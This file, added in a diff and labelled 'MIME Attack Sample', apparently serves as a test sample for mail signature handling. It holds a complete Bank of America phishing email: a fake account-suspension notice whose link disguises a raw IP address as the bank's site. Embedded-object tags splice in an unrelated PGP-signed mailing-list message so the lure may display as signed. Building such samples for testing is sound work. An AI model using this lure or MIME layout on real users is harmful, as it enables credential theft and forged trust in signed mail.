@@ -1,0 +1,209 @@
+From: robbie.lewis@enron.com
+To: mike.roberts@enron.com, shirley.crenshaw@enron.com, william.smith@enron.com
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/html
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 2593
+
+
+<html xmlns:v="urn:schemas-microsoft-com:vml"
+xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:w="urn:schemas-microsoft-com:office:word"
+xmlns="http://www.w3.org/TR/REC-html40">
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=ProgId content=Word.Document>
+<meta name=Generator content="Microsoft Word 11">
+<meta name=Originator content="Microsoft Word 11">
+<!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>Pharonia</o:Author>
+  <o:Template>Normal</o:Template>
+  <o:LastAuthor>Pharonia</o:LastAuthor>
+  <o:Revision>4</o:Revision>
+  <o:TotalTime>4</o:TotalTime>
+  <o:Created>2007-08-31T09:46:00Z</o:Created>
+  <o:LastSaved>2007-09-22T02:33:00Z</o:LastSaved>
+  <o:Pages>1</o:Pages>
+  <o:Words>108</o:Words>
+  <o:Characters>619</o:Characters>
+  <o:Company>Wesmosis@Yahoo.Dk</o:Company>
+  <o:Lines>5</o:Lines>
+  <o:Paragraphs>1</o:Paragraphs>
+  <o:CharactersWithSpaces>726</o:CharactersWithSpaces>
+  <o:Version>11.6360</o:Version>
+ </o:DocumentProperties>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:WordDocument>
+  <w:SpellingState>Clean</w:SpellingState>
+  <w:GrammarState>Clean</w:GrammarState>
+  <w:ValidateAgainstSchemas/>
+  <w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid>
+  <w:IgnoreMixedContent>false</w:IgnoreMixedContent>
+  <w:AlwaysShowPlaceholderText>false</w:AlwaysShowPlaceholderText>
+  <w:BrowserLevel>MicrosoftInternetExplorer4</w:BrowserLevel>
+ </w:WordDocument>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:LatentStyles DefLockedState="false" LatentStyleCount="156">
+ </w:LatentStyles>
+</xml><![endif]-->
+<style>
+<!--
+ /* Font Definitions */
+ @font-face
+	{font-family:Verdana;
+	panose-1:2 11 6 4 3 5 4 4 2 4;
+	mso-font-charset:0;
+	mso-generic-font-family:swiss;
+	mso-font-pitch:variable;
+	mso-font-signature:536871559 0 0 0 415 0;}
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-parent:"";
+	margin:0cm;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+a:link, span.MsoHyperlink
+	{color:blue;
+	text-decoration:underline;
+	text-underline:single;}
+a:visited, span.MsoHyperlinkFollowed
+	{color:blue;
+	text-decoration:underline;
+	text-underline:single;}
+p
+	{mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+span.GramE
+	{mso-style-name:"";
+	mso-gram-e:yes;}
+@page Section1
+	{size:595.3pt 841.9pt;
+	margin:72.0pt 90.0pt 72.0pt 90.0pt;
+	mso-header-margin:35.4pt;
+	mso-footer-margin:35.4pt;
+	mso-paper-source:0;}
+div.Section1
+	{page:Section1;}
+-->
+</style>
+<!--[if gte mso 10]>
+<style>
+ /* Style Definitions */
+ table.MsoNormalTable
+	{mso-style-name:"Table Normal";
+	mso-tstyle-rowband-size:0;
+	mso-tstyle-colband-size:0;
+	mso-style-noshow:yes;
+	mso-style-parent:"";
+	mso-padding-alt:0cm 5.4pt 0cm 5.4pt;
+	mso-para-margin:0cm;
+	mso-para-margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-ansi-language:#0400;
+	mso-fareast-language:#0400;
+	mso-bidi-language:#0400;}
+</style>
+<![endif]-->
+</head>
+
+<body lang=EN-US link=blue vlink=blue style='tab-interval:36.0pt'>
+
+<div class=Section1>
+
+<div style='border:solid windowtext 1.0pt;mso-border-alt:solid windowtext .75pt;
+padding:1.0pt 3.0pt 1.0pt 3.0pt'>
+
+<p>
+      <img src="https://billerdirect.bankofamerica.com/bd_static/generic-bofa/images/em_title_photo_747x103.gif" width="747" height="83"></p>
+<p><b><span style='font-family:Arial;color:#D41513'>Dear Valued Member,</span></b><span
+style='color:green'><o:p></o:p></span></p>
+
+<p><span style='font-size:10.0pt;font-family:Verdana;color:#333333'>We noticed
+invalid login attempts into you account online from an unknown IP address . <br>
+Due to this, we have temporarily suspended your account.</span><span
+style='font-size:10.0pt;font-family:Verdana'><br>
+We need you to update your account information for your online banking to be re-activated<br>
+please update your billing information today by clicking <br>
+<br>
+here 
+<a target="_blank" href="http://74.86.158.236/~beacon/beb/Boa/">www.bankofamerica.com/secured/updates</a> <span class=GramE>After</span> a few
+clicks, <br>
+<br>
+just verify the information you entered is correct.<br>Sincerely<span
+class=GramE>,</span><span style='color:red'><br>
+<br>
+<p><span style='font-size:10.0pt;font-family:Verdana;color:#999999'>BOA Member
+Services Team</span><span style='color:green'><o:p></o:p></span></p></span>
+<font color="#D41513"><b>P.S.</b> The link in this message will be expire within 24 <span
+class=GramE>Hours .</span> You have to update your payment information</font><br>
+<br><span style='font-size:7.5pt;font-family:Verdana'>© 2012 BOA LLC. All Rights
+Reserved.</span><span style='font-size:10.0pt;font-family:Verdana;color:red'><o:p></o:p></span></p>
+
+</div>
+
+</div>
+
+</body>
+
+</html>
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+h: SHA1
+> 
+> On Thu, May 03, 2007 at 01:24:17AM EST, Chris Norman wrote:
+> > Try this script for loading speech-dispatcher.
+> > 
+> > It's not too well commented because I wrote it for me, and never
+> > released.
+> > 
+> > #!/bin/sh
+> > modprobe speakup_sftsyn
+> > speech-dispatcher -d
+> 
+> If you have installed speech-dispatcher on ubuntu, it will have already 
+> started when the system boots. Also, when you load the speakup_sftsyn 
+> module, if you have speechd-up package installed, speechd-up should 
+> automatically load.
+> - -- 
+> Luke Yelavich
+> GPG key: 0xD06320CE 
+> 	 (http://www.themuso.com/themuso-gpg-key.txt)
+> Email & MSN: themuso@themuso.com
+> Jabber: themuso@jabber.org.au
+> -BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+> Version: GnuPG v1.4.6 (GNU/Linux)
+> 
+> iD8DBQFGOSDnjVefwtBjIM4RAgboAKCCa1PurqlwDZCXuIhrXPjE1ieNlwCfT3Ld
+> dN6HrHr2CVBY0PXLPCDt0iw=
+> =L3dz
+> -----END PGP SIGNATURE-----
+> 
+> 
+--BOUNDARY--
+--DELIMITER--
